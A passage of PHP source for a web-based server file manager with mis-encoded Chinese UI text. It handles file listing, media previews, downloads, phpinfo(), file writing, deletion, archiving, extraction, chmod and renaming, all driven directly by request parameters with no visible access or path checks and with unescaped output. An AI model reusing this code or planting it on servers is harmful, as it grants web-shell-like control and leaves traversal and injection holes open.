<a href="#"  onmousemove="s2('div<?=$is?>','<?=$dir?>/<?=$file?>')" onmouseout="cl2('div<?=$is?>')"><div class="search"></div></a>
<?}?>
<div id="div<?=$is?>" class="mtitle">
<table border="0" width="100%">
	<tr>
		<td width="100"><img src="" id="imgdiv<?=$is?>" width="100"  height="90"></td>
		<td valign="top">
<br>
��:<?=$info[width]?><br>
��:<?=$info[height]?><br>
����:<?=$info[type]?><br>
�ļ���С:<?=$size?>
</td>
	</tr>
</table>
</div>
<?
}
if($Fnames=="mp3"){
$qmp3=$dir."/".$file."|".$qmp3;
?>
<a href="#"  onmousemove="s2('div<?=$is?>','<?=$dir?>/<?=$file?>')" onmouseout="cl2('div<?=$is?>')">
<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="25" height="14">
      <param name="movie" value="http://tools.meqzone.com/others/play/swf/2.swf?file=<?=$dir?>/<?=$file?>&width=25&songVolume=100&backColor=E8E8E8&frontColor=000000&autoStart=false&repeatPlay=false&showDownload=false" />
      <param name="quality" value="High" />
      <param value="transparent" name="wmode" />
      <embed src="http://tools.meqzone.com/others/play/swf/2.swf?file=<?=$dir?>/<?=$file?>&width=25&songVolume=100&backColor=E8E8E8&frontColor=000000&autoStart=false&repeatPlay=false&showDownload=false" width="25" height="14" quality="High" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" wmode="transparent"></embed>
</object>
</a>
<div id="div<?=$is?>" class="mtitle">
<?
	$Title=$info[Title];
	$Artist=$info[Artist];
	$AlbumTitle=$info[AlbumTitle];
	$Year=$info[Year];
	$Genre=$info[Genre];
	$bitrate=$info[meta][bitrate];
?>
��������:<span id="Title<?=$is?>"><?=$Title?></span><br>
������:<span id="Artist<?=$is?>"><?=$Artist?></span><br>
ר��:<span id="AlbumTitle<?=$is?>"><?=$AlbumTitle?></span><br>
����ʱ��:<span id="Year<?=$is?>"><?=$Year?></span><br>
����:<span id="Genre<?=$is?>"><?=$Genre?></span><br>
������:<?=$bitrate?>bps
</div>
<?
}
if($Fnames=="flv"){
?>
<a href="#"  onclick="showid('div<?=$is?>')"><div class="search"></div></a>
<div id="div<?=$is?>" class="mtitle" style="height:375px;width:500px;">
<object classid="clsid:D27CDB6E-AE6D-11CF-96B8-444553540000" id="obj1" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0" border="0" width="100%" height="100%">
	<param name="movie" value="http://player.longtailvideo.com/player.swf?file=http://<?=filename();?><?=$dir?>/<?=$file?>">
	<param name="quality" value="High">
	<embed src="http://player.longtailvideo.com/player.swf?file=http://<?=filename();?><?=$dir?>/<?=$file?>" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" name="obj1" width="100%" height="100%" quality="High">
</object>
</div>
<?
}
if($Fnames=="swf"){
?>
<a href="#" onclick="showid('div<?=$is?>')"><div class="search"></div></a>
<div id="div<?=$is?>" class="mtitle" style="height:<?=$info[1]?>px;width:<?=$info[0]?>px;">
<object classid="clsid:D27CDB6E-AE6D-11CF-96B8-444553540000" id="obj1" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0" border="0" width="100%" height="100%">
	<param name="movie" value="<?=$dir?>/<?=$file?>">
	<param name="quality" value="High">
	<embed src="<?=$dir?>/<?=$file?>" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" name="obj1" quality="High" width="100%" height="100%">
</object>
</div>
<?
}
if($Fnames=="zip"){
?>
<a href="?iframeA=3&dir=<?=$dir?>&fileName=<?=$file?>" target="ajaxurl" onclick="$$('xin').innerHTML='ZIP���:<?=$file?>';" title="Ԥ��"><div class="search"></div></a>
<?
}
if($Fnames=="xls"||$Fnames=="xlsx"){
?>
<a href="?excel=yes&file=<?=$dir?>/<?=$file?>&filename=<?=$file?>" target="_blank"  title="Ԥ��<?="\n"?>֧���ⲿ����"><div class="search"></div></a>
<?
}
if($Fnames=="php"){
?>
<a href="?bj=1&A=6&dir=<?=$dir?>&fileName=<?=$file?>" title="����Ԥ��" target="_blank"><div class="search"></div></a>
<?
}
?>
                          </td>
<td width="50" align="right" title="<?
if($Fnames=="php"||$Fnames=="asp"||$Fnames=="aspx"||$Fnames=="jsp"||$Fnames=="htm"||$Fnames=="html"||$Fnames=="xml"||$Fnames=="js"||$Fnames=="css"||$Fnames=="txt"||$Fnames=="inc"||$Fnames=="ini"||$Fnames=="json"){
	echo "����";
  }else if($Fnames=="mp3"){
  echo "������";
  }else if($Fnames=="flv"){ 
    	if($color9==1){
      echo "Ƭ��";
      }else{
      echo "�ѹرն�FLV��ʶ��";
      }
  }else{
  echo "�޷�ʶ��";
  }
  ?>">
	<?
	if($Fnames=="php"||$Fnames=="asp"||$Fnames=="aspx"||$Fnames=="jsp"||$Fnames=="htm"||$Fnames=="html"||$Fnames=="xml"||$Fnames=="js"||$Fnames=="css"||$Fnames=="txt"||$Fnames=="inc"||$Fnames=="ini"||$Fnames=="json"){
	echo $encode=get_encode($dir.'/'.$file);
  }else if($Fnames=="mp3"){
  echo $encode=$bitrate."bps";
  }else if($Fnames=="flv"){ 
  	if($color9==1){
  echo fn(getTime($dir."/".$file));
      }else{
  echo "No";
      }
  }else{
  echo $encode="Unknown";
  }
	?>
</td>
                            <td width="70" align="right"><?=$size?></td>
                            <td width="60" title="<?echo $dird."/".$dirx;?>"><input type="button" class="submit"  style="height:20px;width:60px;background:url(?imgname=allbgs.gif) no-repeat 0px -158px;" value="��<?=$fileperm?>"   onclick="$$('key666').src='?bj=8&key=<?=$fileperm?>&dir=<?=$dir?>&file=<?=$file?>&actions=editperming2',showid('smallLay9');"></td>
                            <td width="25"><input type="button" class="submit"  name="B3" onclick="window.open('?bj=1&A=7&dir=<?=urlencode($dir)?>&fileName=<?=urlencode($file)?>')"  style="height:20px;width:25px;background:url(?imgname=allbgs.gif) no-repeat 0px -334px;" title="���� MD5(<?if(filesize("$dir/$file")>0 && filesize("$dir/$file")<1073741824){echo md5_file($dir."/".$file);}?>)"></td>
                            <td width="25"><input type="button" class="submit"  name="B3" onclick="if(confirm('ȷ��ɾ�� <?=$file?> !')){$$('header').src='?del=2&dir=<?=$dir?>&fileName=<?=$file?>';}"  style="height:20px;width:25px;background:url(?imgname=allbgs.gif) no-repeat 0px -302px;" title="ɾ��"></td>
                            <td width="25"><input type="button" class="submit" name="B3" onclick="showid('smallLay11'),$$('oldname').value='<?=$file?>',$$('newT8').value='<?=$file?>';"  style="height:20px;width:25px;background:url(?imgname=allbgs.gif) no-repeat 0px -222px;" title="��������"></td>
                            <td width="20"><input type="button" class="submit"  name="B3" onclick="wjbz11('<?=$file?>','<?=$dir?>','<?=$dir?>');"  style="height:20px;width:20px;background:url(?imgname=allbgs.gif) no-repeat 0px -513px;" title="�ļ���ע"></td>
<td width="25">
<?if($Fnames=="mp3"){?>
<input type="button" class="submit"  name="B3" onclick="mp32('<?=$dir?>/<?=$file?>','<?=$is?>');"  style="height:20px;width:25px;background:url(?imgname=allbgs.gif) no-repeat 0px -530px;" title='�༭�ļ�<?="\n"?>�ļ�����ʱ��:<?echo $lastsave."\n";?>����޸�ʱ��:<?echo $lastsaves."\n";?>������ʱ��:<?echo $lastsavesd."\n";?>���עʱ��:<?=$wjbztime?>'>
<?}else{?>
<input type="button" class="submit"  name="B3" onclick="window.open('?bj=1&encode=<?=$encode?>&dir=<?=urlencode($dir)?>/&fileName=<?=urlencode($file)?>');"  style="height:20px;width:25px;background:url(?imgname=allbgs.gif) no-repeat 0px -530px;" title='�༭�ļ�<?="\n"?>�ļ�����ʱ��:<?echo $lastsave."\n";?>����޸�ʱ��:<?echo $lastsaves."\n";?>������ʱ��:<?echo $lastsavesd."\n";?><?if(file_exists("8db/".base64_encode(realpath($dir."/".$file)))){echo "���עʱ��:".$wjbztime;}?>'>
<?}?>
</td>
         </tr>

<?
}
}
}
}
}
$Fi=$is;
@closedir($dirs); 
?>
</table>
<?}?>

</td>
			</tr>
		</table>
<table>
	<tr>
		<td width=300>
��<?=$Mi?>��Ŀ¼
		</td>
		<td>
��<?=$Fi?>���ļ� ��<?=byte_format($gsize)?>
<?if($qmp3!=""){?>
<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="160" height="12" title="����ȫ��MP3">
<param name="movie" value="http://tools.meqzone.com/others/play/swf/1.swf?mp3=<?=$qmp3?>&autostart=0&bgcolor=ffffff" />
<param name="quality" value="high" />
<param value="transparent" name="wmode" />
<embed src="http://tools.meqzone.com/others/play/swf/1.swf?mp3=<?=$qmp3?>?&autostart=0&bgcolor=ffffff" width="160" height="12" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash"></embed>
</object>
<?}?>
		</td>
	</tr>
</table>
<?
die();
}
//��ȡ��ǰ·��----------------------------------------------------------------
if($bj==1&&$A==5){
echo realpath($dir);
die();
}
//�������--------------------------------------------------------------------
if($bj==1&&$A==6){
phpjl($dir,$fileName);
die();
}
//�����ļ�--------------------------------------------------------------------
if($bj==1&&$A==7){
if($fileName==""){
$downfile=$dir;
}else{
$downfile=$dir."/".$fileName;
}
if (!@is_file($downfile)) {echo"��Ҫ�µ��ļ�������";exit;}
	$filename = basename($downfile);
	$filetype=strtolower(substr($filename,strrpos($filename,".")));
	//View picture
	if ($filetype=='.gif') {
		header('Content-type: image/gif');
		@readfile($downfile);
		exit;
	}
	if ($filetype=='.ico') {
		header('Content-type: image/x-icon');
		@readfile($downfile);
		exit;
	}
	elseif ($filetype=='.jpg' or $extension[1]=='.jpeg') {
		header('Content-type: image/jpeg');
		@readfile($downfile);
		exit;
	}
	elseif ($filetype=='.png') {
		header('Content-type: image/png');
		@readfile($downfile);
		exit;}
	elseif ($filetype=='.swf') {
		header('Content-type: application/x-shockwave-flash');
		@readfile($downfile);
		exit;}
	elseif ($filetype=='.mp3') {
		header('Content-type: audio/mpeg');
		@readfile($downfile);
		exit;}
	elseif ($filetype=='.wma') {
		header('Content-type: audio/x-ms-wma');
		@readfile($downfile);
		exit;}
	elseif ($filetype=='.ram' or $filetype=='.rm') {
		header('Content-type: audio/x-pn-realaudio');
		@readfile($downfile);
		exit;}
	// Download
    if (preg_match('@Opera(/| )([0-9].[0-9]{1,2})@', $HTTP_USER_AGENT, $log_version)) {
        $USR_BROWSER_AGENT='OPERA';
    } elseif (preg_match('@MSIE ([0-9].[0-9]{1,2})@', $HTTP_USER_AGENT, $log_version)) {
        $USR_BROWSER_AGENT='IE';
    } 
	else $USR_BROWSER_AGENT='OTHER';
    $mime_type=($USR_BROWSER_AGENT=='IE'||$USR_BROWSER_AGENT=='OPERA')?'application/octetstream':'application/octet-stream';
	header('Content-Type: ' . $mime_type);
	header('Expires: ' . gmdate('D, d M Y H:i:s') . ' GMT');
	// lem9 & loic1: IE need specific headers
	if ($USR_BROWSER_AGENT=='IE') {
		header('Content-Disposition: inline; filename="' . $filename . '"');
		header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
		header('Pragma: public');
	} else {
		header('Content-Disposition: attachment; filename="' . $filename . '"');
		header('Pragma: no-cache');
	}
	@readfile($downfile);
	exit;
}
//̽��phpinfo--------------------------------------------------------------------
if($bj==1&&$A==8){
phpinfo();
die();
}
//php ѹ��----------------------------------------------------------------------
if($bj==1&&$A==9){
$filename=$dir."/".$fileName;
  $fd = @fopen($filename, "r" );
  $contents = @fread($fd, filesize($filename));
  @fclose( $fd );
echo strip_whitespace($contents);
die();
}
//д���ļ�---------------------------------------------------------------------
if($bj==1&&$A==10){
 if($B52=="utf8"){
$co= iconv('GB2312', 'UTF-8', $co);
$co = preg_replace( '/^(\xef\xbb\xbf)/', '', $co );//ɾ��Bom
$Ϊ="ΪUTF8";
}
if($new==1){
$filename=$B53."/".$Fname;
}else{
$filename=$dir."/".$Fname;
}
$co=stripslashes($co);
writetofile($filename,$co);
?>
<script>
alert("����<?=$Ϊ?> <<?=$Fname?>>�ɹ�");
parent.$$("TJ").value="�Ѿ�����";
parent.$$("xin").innerHTML="����<?=$Fname?>�ɹ�";
<?
if($new==1){
?>
parent.getData2('?bj=1&A=4&dir=<?=urlencode($B53)?>','F');
<?}?>
</script>
<?
die();
}
//д���ļ���ע----------------------------------------------------------------
if($wjbz==1){
$url="8db/".base64_encode(realpath($wjbzdir."/".$wjbzname));
mkdir('8db', 0777);
if($S1==""){
@unlink($url);
}else{
writetofile($url,$S1);
}
?>
<script>

if(parent.$$('wjbzx6').value!="@"){
parent.$$('ajaxurl').src="?iframeA=1&dir="+parent.$$('wjbzx6').value;
}
parent.$$("xin").innerHTML="����<?=$wjbzname?> �ļ���ע�ɹ�";
parent.getData2("?wjbz=3&wjbzdir=<?=$wjbzdir?>&wjbzname=<?=$wjbzname?>","wjbztime");
alert("����<<?=$wjbzname?>> �ļ���ע�ɹ�");
</script>
<?
die();
}
//��ȡ�ļ���ע----------------------------------------------------------------
if($wjbz==2){
$filename="8db/".base64_encode(realpath($wjbzdir."/".$wjbzname));
  $fd = @fopen($filename, "r" );
  $contents = @fread($fd, filesize($filename));
  @fclose( $fd );
die($contents);
}
//��ȡ�ļ���עʱ��------------------------------------------------------------
if($wjbz==3){
$url="8db/".base64_encode(realpath($wjbzdir."/".$wjbzname));
if(file_exists($url)){
$a=filemtime($url);
echo "��עʱ�䣺".date('Y-m-d H:i:s',$a);
}else{
echo "��û�б�ע!   <a href=\"javascript:wjbzx(1);\">������ʧ��ע</a>";
}
die();
}
//��ȡ�ļ���ע�б�------------------------------------------------------------
if($wjbz==4){
$wjbl=scandir("8db");
for($i = 0; $i < count($wjbl); $i++) {
if($wjbl[$i]!="."&&$wjbl[$i]!=".."&&$wjbl[$i]!=""){
?>
<a href="javascript:if(confirm('ȷ��������ļ���ע? ')){wjbzrl('<?=$wjbl[$i]?>');}">����</a>��<?=base64_decode($wjbl[$i])?><br>
<?
}
}
die();
}
if($wjbz==5){
$yurl="8db/".$yname;
$nurl="8db/".base64_encode(realpath($wjbzdir."/".$wjbzname));
if (file_exists($yurl)){ 
		if (rename($yurl,$nurl)) //��ԭ�ļ���������
		{
			echo "����ɹ�!";
		}else{ 
			echo "����ʧ��" ; 
		}
	}
die();
}
//�½��ļ���------------------------------------------------------------------
if($B==1){

if($T1==""){
$T1="New";
}
createDir($dir."/".$T1);
$��Ϣ= "�½��ļ��У�".$T1;
if($bj==1){
?>
<script>
parent.getData2('?bj=1&A=3&dir=<?=urlencode($dir)?>','M','<?=$dir?>');
parent.showidg('smallLay3');
parent.$$("xin").innerHTML="<?=$��Ϣ?>";
</script>
<?
}else{
?>
<script>
parent.getData3('?bj=1&A=A3&dir=<?=urlencode($dir)?>','<?=urlencode($dir)?>','mullu');
parent.$$("xin").innerHTML="<?=$��Ϣ?>";
parent.showidg('smallLay3');
</script>
<?
}
die();
}
//ɾ���ļ�-----------------------------------------------------------------------
if($del==1){
if(empty($file)) {
		$��Ϣ= "δѡ��ɾ���ļ�";
	}else{
		$f=0;
		$d=0;
                @set_time_limit(0);
		delmore($file);
		if($f+$d>0) {
		      $��Ϣ= "$f ���ļ� $d ��Ŀ¼ ɾ���ɹ�";
	         }else{
		      $��Ϣ="�ļ�ɾ��ʧ��";
	       }
     }
?>
<script>
parent.getData3('?bj=1&A=A3&dir=<?=urlencode($dir)?>','<?=urlencode($dir)?>','mullu');
parent.$$("xin").innerHTML="<?=$��Ϣ?>";
parent.showidg("smallLay20");
</script>
<?
	die();
}


if($del==2){
$file[]=$fileName;
if(empty($file)) {
		$��Ϣ= "δѡ��ɾ���ļ�";
	}else{
		$f=0;
		$d=0;
                @set_time_limit(0);
		delmore($file);
		if($f+$d>0) {
		      $��Ϣ= "$f ���ļ� $d ��Ŀ¼ ɾ���ɹ�";
	         }else{
		      $��Ϣ="�ļ�ɾ��ʧ��";
	       }
     }
 if($DL==1){
 ?>
 <script>
     parent.$$("xin").innerHTML="<?=$��Ϣ?>";
     parent.getData2('?bj=1&A=4&dir=<?=urlencode($dir)?>','F','<?=$dir?>');
     parent.getData2('?bj=1&A=3&dir=<?=urlencode($dir)?>','M','<?=$dir?>');
     parent.showidg("smallLay20");
</script>
<?
   }else{
?>
<script>
parent.getData3('?bj=1&A=A3&dir=<?=urlencode($dir)?>','<?=urlencode($dir)?>','mullu');
parent.$$("xin").innerHTML="<?=$��Ϣ?>";
</script>
<?
  }
	die();
}
//ѹ���ļ�---------------------------------------------------------------------
if($B=='zip') {
	//echo $key=$dir."/".$key;
	@set_time_limit(0);
	@ignore_user_abort(1);
	if(empty($file)) $��Ϣ="δѡ��ѹ���ļ���Ŀ¼";
	elseif(empty($key)) $��Ϣ="δ����ZIP�ļ���";
	else
	{
		$zip = new Zip;
		unset($zipfiles);
		for($k=0;isset($file[$k]);$k++)
		{
			$zipfile=$dir."/".$file[$k];
			if(is_dir($zipfile))
			{
				unset($zipfilearray);
				addziparray($file[$k]);
				for($i=0;$zipfilearray[$i];$i++)
				{
					$filename=$zipfilearray[$i];
					$filesize=@filesize($dir."/".$zipfilearray[$i]);
					$fp=@fopen($dir."/".$filename,rb);
					$zipfiles[]=Array($filename,@fread($fp,$filesize));
					@fclose($fp); 
				}
			}
			else
			{
				$filename=$file[$k];
				$filesize=@filesize($zipfile);
				$fp=@fopen($zipfile,rb);
				$zipfiles[]=Array($filename,@fread($fp,$filesize));
				@fclose($fp);
			}
		}
		$zip->Add($zipfiles,1);
		if(@fputs(@fopen("$dir/$key","wb"), $zip->get_file())) $��Ϣ= "$key �ļ�ѹ���ɹ�";
		else $��Ϣ="$key �ļ�ѹ��ʧ��";
	}
?>
<script>
parent.getData3('?bj=1&A=A3&dir=<?=urlencode($dir)?>','<?=urlencode($dir)?>','mullu');
parent.$$("xin").innerHTML="<?=$��Ϣ?>";
parent.showidg('smallLay5');
</script>
<?
	die();
}
if($action=="excel"){
	die("Ԥ��");
}

//------------------------------���а�-----------------------------------------------------------
if($action=="cut"||$action=="copy"){
	if(!empty($file)) {
		$parsefile=$file[0];
		for($i=1;$file[$i];$i++) $parsefile.="|".$file[$i];
		$act=$action;
		$olddir=$dir;
		setcookie("parsefile",$parsefile,0);
		setcookie("act",$act,0);
		setcookie("olddir",$olddir,0); 
		session_register("parsefile");
		session_register("act");
		session_register("olddir");
	}
}
if($action=="parse"){
	if(!empty($HTTP_COOKIE_VARS['act'])&&!empty($HTTP_COOKIE_VARS['parsefile'])&&!empty($HTTP_COOKIE_VARS['olddir']))
	{   //��COOKIE�ж������а�����
		$act=$HTTP_COOKIE_VARS['act'];
		$olddir=$HTTP_COOKIE_VARS['olddir'];
		$file=explode("|",$HTTP_COOKIE_VARS['parsefile']);
	}else{	
		session_register("parsefile");
		session_register("act");
		session_register("olddir");
		if(!empty($_SESSION['act'])&&!empty($_SESSION['parsefile'])&&!empty($_SESSION['olddir']))
		{   //��SESSION�ж������а�����
			$act=$_SESSION['act'];
			$olddir=$_SESSION['olddir'];
			$file=explode("|",$_SESSION['parsefile']);
		}
	}
}

	if(!empty($HTTP_COOKIE_VARS['act'])&&!empty($HTTP_COOKIE_VARS['parsefile'])&&!empty($HTTP_COOKIE_VARS['olddir']))
	{   //��COOKIE�ж������а�����
		$actABS=$HTTP_COOKIE_VARS['act'];
		$olddirABS=$HTTP_COOKIE_VARS['olddir'];
		$fileABS=explode("|",$HTTP_COOKIE_VARS['parsefile']);
	}else{	
		session_register("parsefile");
		session_register("act");
		session_register("olddir");
		if(!empty($_SESSION['act'])&&!empty($_SESSION['parsefile'])&&!empty($_SESSION['olddir']))
		{   //��SESSION�ж������а�����
			$actABS=$_SESSION['act'];
			$olddirABS=$_SESSION['olddir'];
			$fileABS=explode("|",$_SESSION['parsefile']);
		}
	}
//==========����================================
if($action=="cut"){
	if(empty($file)) $��Ϣ= "δѡ������ļ�";
	else
	{
		$��Ϣ=  "�ļ��Ѿ��ɹ����е� ���а�";
	}
?>
<script>
parent.$$("xin").innerHTML="<?=$��Ϣ?>";
</script>
<?
	die();
}
if($action=="copy"){
	if(empty($file)) $��Ϣ=  "δѡ�����ļ�";
	else
	{
		$��Ϣ=  "�ļ��Ѿ��ɹ����Ƶ� ���а�";
	}
?>
<script>
parent.$$("xin").innerHTML="<?=$��Ϣ?>";
</script>
<?
	die();
}
if($action=="parse"){
	if(empty($file)) {
		$��Ϣ=  "���а������ļ����ݣ�ճ�����ɹ�";
        }else if($olddir==$dir) {
	     $��Ϣ=  "�ļ�ԴĿ¼��Ŀ��Ŀ¼��ͬ��ճ�����ɹ�";
        }else{		
		$f=0;
		$d=0;
		if($act=="copy"){
			@copymore($file);
			if($f+$d>0){
				$��Ϣ=  "$f ���ļ� $d ��Ŀ¼ ճ���ɹ�,��Ŀ¼��$olddir ,���Ƶ���$dir";
				}else{ 
				$��Ϣ=  "�ļ�����ʧ��";
				}
		}else {
			
			@cutmore($file);
			if($f+$d>0){
				$��Ϣ=  "$f ���ļ� $d ��Ŀ¼ ���гɹ�,��Ŀ¼��$olddir ,���е���$dir";
			}else {
				$��Ϣ=  "�ļ�����ʧ��";
		}
		}
	}
?>
<script>
parent.getData3('?bj=1&A=A3&dir=<?=urlencode($dir)?>','<?=urlencode($dir)?>','mullu');
parent.$$("xin").innerHTML="<?=$��Ϣ?>";
</script>
<?
	die();
}
///�鿴���а�----------------------------------------------
if($action=="jianqieban"){
?>
<table  width="100%"  border="0" cellspacing="0" cellpadding="0">
	<tr>
		<td  valign="top">
<table  width="100%"  border="0" cellspacing="0" cellpadding="0">
			<tr style="background:#EFEFEF;">
				<td width="15"></td>
				<td>�ļ���[<?=$olddirABS?>]</td>
			</tr>
</table>
<div style="height:400px; overflow-y:auto;overflow-x:visible;">
		<table width="100%"   border="0" cellspacing="0" cellpadding="0">

<?
                 for($i=0;$i<count($fileABS);$i++) {
                            $b=$olddirABS."/".$fileABS[$i];
                                  $a=is_dir($b);
	                                  if($a=="1"){
?>
<tr style="background:<?if($i%2==1){echo "#EFEFEF";}else{echo "#FFFFFF";}?>;" onmouseover=" trColor1(this);" onmouseout="trColor2(this,'<?if($i%2==1){echo "#EFEFEF";}else{echo "#FFFFFF";}?>');" onClick="trColor3(this,'<?if($i%2==1){echo "#EFEFEF";}else{echo "#FFFFFF";}?>');" >
 	<td width="15"><div class="folder"></div></td>
 	<td><?=$fileABS[$i]?></td>
 </tr>
<?
                                         }
                 }
?>
		</table>
</div>
		</td>
		
		<td  valign="top">
<table  width="100%"  border="0" cellspacing="0" cellpadding="0">
			<tr style="background:#EFEFEF;">
				<td width="15"></td>
				<td>�ļ�</td>
			</tr>
</table>
<div style="height:400px; overflow-y:auto;overflow-x:visible;">
		<table  width="100%"  border="0" cellspacing="0" cellpadding="0">
<?
                 for($i=0;$i<count($fileABS);$i++) {
                            $b=$olddirABS."/".$fileABS[$i];
                                  $a=is_dir($b);
	                                  if($a=="0"){
?>
 <tr style="background:<?if($i%2==1){echo "#EFEFEF";}else{echo "#FFFFFF";}?>;" onmouseover=" trColor1(this);" onmouseout="trColor2(this,'<?if($i%2==1){echo "#EFEFEF";}else{echo "#FFFFFF";}?>');" onClick="trColor3(this,'<?if($i%2==1){echo "#EFEFEF";}else{echo "#FFFFFF";}?>');" >
				<td width="15"><div class="<?=Fname($fileABS[$i])?>"></div></td>
 	<td><?=$fileABS[$i]?></td>
 </tr>
<?
                                         }
                 }
?>
		</table>
</div>
		</td>
	</tr>
</table>

<?
      die();
}
if($abcd==1){
$img=new HanroadClass;
$img->HrResize($dir."/".$file,1,1,100,80,0,1);
die();
}
///������ͼ-------------------------------------------------
if($action=="simg"){
$img=new HanroadClass;
@mkdirs($dir."/".$imgT1,0777);
for($i=0;$i<count($file);$i++) {	
	if(is_dir($dir."/".$file[$i])=="0"){
		 $path_parts = pathinfo($file[$i]);
     $Fnames = strtolower($path_parts["extension"]);
	  if($Fnames=="jpg"||$Fnames=="jpge"||$Fnames=="gif"||$Fnames=="png"){	
	  	$pathinfo = basename($dir."/".$file[$i]);
	  	$Nm= pathinfo($pathinfo);
	  	$img->HrResize($dir."/".$file[$i],$dir."/".$imgT1,$imgT2.$Nm['filename'],$imgT3,$imgT4,$imgR1); 
	  }
  }
}
?>
<script>
parent.$$("xin").innerHTML="������ͼ���Ŀ����:<?=$imgT1?>Ŀ¼��";
parent.showidg('smallLay14');
parent.getData3('?bj=1&A=A3&dir=<?=urlencode($dir)?>','<?=urlencode($dir)?>','mullu');
</script>
<?
die();
}
///tgz��ʽѹ��----------------------------------------------
if($action=="tgz"){//
	@set_time_limit(0);
	@ignore_user_abort(1);
	$key2=$dir."/".$key2;
       if($file){
                 for($i=0;$i<count($file);$file_tmp1=$dir."/",$i++) {
                 	$file_tmp1.=$file[$i];
                 	$file_tmp.=$file_tmp1;
                 	if($i!=count($file)-1){ 
                 		$file_tmp.=" ";
                 		}
                 	}
   if(new tar($key2, $file_tmp)) {
   	              $��Ϣ=  "ѡ���ļ��Ѿ��ɹ�ѹ������$key2";
   	            }else {
   	            echo "ѹ��ʧ��";
   	          }
                     }else{
                    $��Ϣ=  "δѡ��Ҫ��tgz��ʽѹ�����ļ����ļ���";
                    }
                       
?>
<script>
parent.$$("xin").innerHTML="<?=$��Ϣ?>";
parent.getData3('?bj=1&A=A3&dir=<?=urlencode($dir)?>','<?=urlencode($dir)?>','mullu');
parent.showidg('smallLay6');
</script>
<?
	die();                   
}
//��ѹ����ѹ����----------------------------------------------
if($action=="extract"){//���н�ѹ��/���
@set_time_limit(0);//���ø�ҳ�����ִ��ʱ��Ϊ300��
     if(empty($file)) $��Ϣ= "δѡ����Ҫ���/��ѹ���ļ�";
     elseif(empty($key3)) $��Ϣ= "δ�����ѹ����Ŀ¼��";
	$pth_key = explode("/",$key3);
   for($i=0;isset($pth_key[$i]);$i++){
     if(!$pth_key[$i]) continue;$pthss_key.=$pth_key[$i]."/";
     if(!is_dir($pthss_key)) @mkdir($pthss_key,0777);
   }
     if(substr($file[0], -3)=='zip'){//zip��ʽ��ѹ��
		$zip = new Zip;
		$zipfile=$dir."/".$file[0];
		$array=$zip->get_list($zipfile);
		$count=count($array);
		$f=0;
		$d=0;
		for($i=0;$i<$count;$i++) {
			if($array[$i][folder]==0) {
				if($zip->Extract($zipfile,$key3,$i)>0) $f++;
			}
			else $d++;
		}
		if($i==$f+$d) $��Ϣ= "$file[0] ��ѹ�ɹ�($f ���ļ� $d ��Ŀ¼)";
		elseif($f==0) $��Ϣ= "$file[0] ��ѹʧ��";
		else $��Ϣ= "$file[0] δ��ѹ���� (�ѽ�ѹ $f ���ļ� $d ��Ŀ¼)";
}

elseif(substr($file[0], -3)=='wlc'){//wlc��ʽ��ѹ��
                  if(wlcunzip("$key3",$dir."/".$file[0])) $��Ϣ= "$file[0]�ɹ������ $key3";
                  else $��Ϣ= "$file[0]���ʧ��";
                 }
elseif(substr($file[0], -3)=='tgz'||substr($file[0], -6)=='tar.gz'||substr($file[0], -3)=='tar')
                {//tgz��ʽ��ѹ��
                      $dir_tmp.=$dir;$dir_tmp.="/".$file[0];
                     if(new tarExtract($dir_tmp, $key3)) $��Ϣ= "$file[0]�ɹ���ѹ����Ŀ¼��$key3";
                 else $��Ϣ="$file[0]��ѹ��ʧ��";
                 }
else $��Ϣ= "��ȷ�����Ƿ�ѡ����ǿ��Խ��/��ѹ���ļ����ͣ�zip,wlc,tgz,tar,tar.gz)";

?>
<script>
parent.getData3('?bj=1&A=A3&dir=<?=urlencode($dir)?>','<?=urlencode($dir)?>','mullu');
parent.$$("xin").innerHTML="<?=$��Ϣ?>";
parent.showidg('smallLay7');
</script>
<?
	die();     
}



//�������༭����-----------------------------------------
if($action=='editperming')//�������༭���Բ���
{
          for($j=0;$j<count($file);$j++)
            {
             $perming=base_convert($key6, 8, 10);
	  chmod("$dir/$file[$j]","$perming");
	  $lastperm=substr(base_convert(fileperms("$dir/$file[$j]"),10,8),-4);
	  $��Ϣ= "$file[$j] �ļ��޸ĺ������Ϊ $lastperm";}
?>
<script>
parent.getData3('?bj=1&A=A3&dir=<?=urlencode($dir)?>','<?=urlencode($dir)?>','mullu');
parent.$$("xin").innerHTML="<?=$��Ϣ?>";
parent.showidg('smallLay10');
</script>
<?
	  die();     
}
if($action=='editperming2')//�༭���Բ���
{
$fileperm=base_convert($perming,8,10);
$��Ϣ=  $msg=@chmod($dir."/".$editperme,$fileperm) ? "�����޸ĳɹ�!" : "�޸�ʧ��!";
$��Ϣ=  " [".$editperme."] �޸ĺ������Ϊ:".substr(base_convert(@fileperms($dir."/".$editperme),10,8),-4)."";
?>
<script>
parent.getData3('?bj=1&A=A3&dir=<?=urlencode($dir)?>','<?=urlencode($dir)?>','mullu');
parent.$$("xin").innerHTML="<?=$��Ϣ?>";
parent.showidg('smallLay9');
</script>
<?
	  die();     
}
//��������----------------------------------------------------
if($action=="rename"){
	if(!file_exists($dir."/".$oldname)) $��Ϣ= "$oldname ������";
	elseif(empty($newname)) $��Ϣ= "δ�����µ��ļ�����Ŀ¼��";
	else
	{
		$newname=str_replace("'","",$newname);
		$newname=str_replace("\"","",$newname);
		$newname=str_replace("&","",$newname);
		$newname=str_replace(",","",$newname);
		$newname=str_replace(";","",$newname);
		$newname=str_replace("/","",$newname);
		$newname=str_replace("\\","",$newname);
		$newname=str_replace("`","",$newname);
		$rn=@rename($dir."/".$oldname,$dir."/".$newname);
		if($rn) $��Ϣ= "$oldname �Ѿ��ɹ�����Ϊ��$newname";
		else $��Ϣ= "����ʧ��";
	}
?>
<script>
